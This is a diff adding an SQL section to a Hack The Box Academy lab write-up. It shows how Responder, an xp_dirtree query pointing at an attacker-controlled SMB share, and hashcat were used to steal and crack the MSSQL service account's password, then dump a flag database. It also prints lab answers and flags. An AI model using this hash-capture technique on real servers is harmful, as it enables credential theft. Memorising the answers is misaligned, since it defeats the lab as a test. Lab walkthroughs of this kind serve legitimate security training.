@@ -2,6 +2,7 @@
 ## Table of Contents
 1. [FTP](#ftp)
 2. [SMB](#smb)
+3. [SQL](#sql)
 
 ### FTP
 #### Tools
@@ -79,3 +80,75 @@
     ssh -o KexAlgorithms=diffie-hellman-group14-sha256 -o Ciphers=aes256-ctr -i id_rsa jason@10.129.203.6 -v
     ```
     The answer is `HTB{SMB_4TT4CKS_2349872359}`.
+
+## SQL
+1. responder
+2. mssqlclient
+### Challenges
+1. What is the password for the "mssqlsvc" user?
+
+    To solve this, first we need to setup responder to capture the hash.
+
+    ```bash
+    responder -I tun0
+    ```
+    Then we run mssqlcient.
+    ```bash
+    mssqlclient.py -p 1433 htbdbuser@10.129.163.211
+    ```
+    In there, we can perform this sql query to do hash stealing.
+    ```bash
+    EXEC master..xp_dirtree '\\10.10.14.16\share\'
+    ```
+
+    ![alt text](Assets/SQL1.png)
+
+    The responder will capture the hash. Then we use hashcat to crack it.
+
+    ```bash
+    hashcat -m 5600 hash.txt /home/mrwhok/ctf/HTB-Academy/footprinting/rockyou.txt
+    ```
+
+    The answer is `princess1`.
+
+2. Enumerate the "flagDB" database and submit a flag as your answer.
+
+    We can login with mssqlclient again by using the credential we just found.
+
+    ```bash
+    mssqlclient.py -p 1433 mssqlsvc@10.129.163.211 -windows-auth
+    ```
+    Then we can examine the database and get the flag. Here the flow of it.
+
+    ```bash
+    SQL (WIN-02\mssqlsvc  guest@master)> SELECT name FROM sys.databases;
+    name      
+    -------   
+    master    
+
+    tempdb    
+
+    model     
+
+    msdb      
+
+    hmaildb   
+
+    flagDB    
+
+    SQL (WIN-02\mssqlsvc  guest@master)> use flagDB;
+    ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
+    INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.
+    SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT name FROM sys.tables;
+    name      
+    -------   
+    tb_flag   
+
+    SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> SELECT * FROM tb_flag;
+    flagvalue                              
+    ------------------------------------   
+    b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}'   
+
+    SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> 
+    ```
+    The answer is `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`.
